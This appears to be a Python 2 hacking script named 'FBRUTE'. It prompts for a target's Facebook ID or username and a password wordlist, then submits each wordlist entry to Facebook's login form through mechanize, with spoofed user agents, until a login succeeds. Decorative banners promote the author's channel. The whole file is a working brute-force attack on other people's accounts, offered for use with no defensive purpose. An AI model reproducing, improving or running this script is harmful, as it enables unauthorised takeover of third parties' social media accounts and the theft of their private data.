#!usr
# -*- coding: utf-8 -*-
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool
import cookielib
import mechanize


wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan



def runntxt(s):
        for noobs in s + '\n':
              sys.stdout.write(noobs)
              sys.stdout.flush()
              time.sleep(100. /2100)

def lodhirt():
    lodhirt = [
     'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X', '      ', 'Black.n4X\n']
    for o in lodhirt:
        print '\r\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;92mSUBSCRIBE CHANNEL \x1b[1;35m' + o,
        sys.stdout.flush()
        time.sleep(0.1)

def loding2():
    looding2 = [
     '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[\033[1;32m✓\033[0m]\n']
    for o in looding2:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mCheck \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.1)

def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.7)

def restart():
    ngulang = sys.executable
    os.execl(ngulang, ngulang, *sys.argv)

def banner():
          os.system('clear')
          os.system('figlet FBRUTE | lolcat')
          runntxt(GG+"======[×]===============[×]=========")
          runntxt(YY+"[+]" "\033[0;1mAuthor""\033[96;1m : NUH ")
          runntxt(YY+"[+]" "\033[0;1mTEAM""\033[96;1m : CYBER SECURITY-N4X")
          runntxt(YY+"[+]" "\033[0;1mCHANNEL""\033[96;1m : BLACK.N4X NAFIS NUH")
          time.sleep(2.1)

tik()
banner()
print
print R+"[\033[0;1m ENTER ID\033[0;1m/ \033[34;1mUsername Facebook Target\033[91m ] "
email_target = str(raw_input(YY+"~>>\033[1;92m  "))
print " "
print R+"[\033[0;1mEnter File Wordlist \033[31m( pass.txt ) \033[31m]"
password_list = str(raw_input(YY+"~~>>\033[1;92m  "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def kel():
         print GG+" "
         n = str(raw_input("[*] CONTINUE CRACKING??? \033[93;1m[y/n]: "))
         if n == 'y' or n == 'Y':
             os.system('python2 BlackX.py')
         elif n == 'n' or n == 'N':
             loding2()
             runntxt(RR+"EXIT FROM PROGRAM...")
             sys.exit()
         else:
             print GG+" "
             print RR+"[!]WRONG OPTION"
             kel()

def edit_wordlist():
          print GL+" "
          pw = str(raw_input(RR+"[!]" "\033[1;92mYOU WANT TO EDIT WORDLIST??? "))
          if pw == 'y' or pw == 'Y':
              tik()
              os.system('nano '+password_list)
              kel()
          elif pw == 'n' or pw == 'N':
              loding2()
              print GG+" "
              runntxt(RR+"EXIT FROM PROGRAM...")
              sys.exit()
          else:
              print RR+"[!]PLEASE ENTER THE RIGHT OPTION"
              edit_wordlist()

def main():
          global noobs
          noobs = mechanize.Browser()
          cj = cookielib.LWPCookieJar()
          noobs.set_handle_robots(False)
          noobs.set_handle_redirect(True)
          noobs.set_cookiejar(cj)
          noobs.set_handle_equiv(True)
          noobs.set_handle_referer(True)
          noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
          runn_noobs()
          life()
          print " "
          print RR+"[×]SORRY...NO PASSWORD WAS CORRECT..."
          print " "

def life():
        global nuh_password
        password_nob = open(password_list, "r")
        for nuh_password in password_nob :
            password_nob = nuh_password.replace("\n","")
            nuh(nuh_password)

def runn_noobs():
       global password_list
       os.system('clear')

       print RR+".﹎ ┈ ┈ ┈"
       print RR+"﹎┈   ●   o  .﹎ ﹎"
       print RR+"┈ ┈ /█\/▓\ ﹎ ┈"
       print WW+"▅▆▇█████▇▆▅"
       print " C R A C K I N G  T H E  A C C O U N T"
       print '\033[1;92mby Black.n4X'
       print
       print
       nuub = open(password_list, 'r')
       nuub = nuub.readlines()
       print WW+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
       print WW+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
       print WW+" [#] Tunggu Proses Cracking\033[97;1m.........."
       print " "

def nuh(nuh_password):
  try:
     sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[0;1m"+email_target+"\033[31m]\033[36;1m Cracking ~~>> \033[0;1m"+nuh_password)
     sys.stdout.flush()
     noobs.addheaders = [('User-agent', random.choice(useragents))]
     site = noobs.open(login)
     noobs.select_form(nr = 0)
     noobs.form['email'] = email_target
     noobs.form['pass'] = nuh_password
     tom = noobs.submit()
     mask = tom.geturl()
     if mask != login and (not 'login_attempt' in mask):
                      print " S U C C E S "
                      print "          P A S S W O R D  F I N D "
                      print RR+"+-------------------------------------------+"
                      print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
                      print (RR+"#\033[97m Password Target:\033[92m {}").format(nuh_password)
                      print " "
                      raw_input(WW+"PRESS ENTER TO EXIT...")
                      os.system('exit')

  except KeyboardInterrupt:
      print wd+"STOP..."
      edit_wordlist()
      sys.exit()


if __name__=='__main__':
	main()

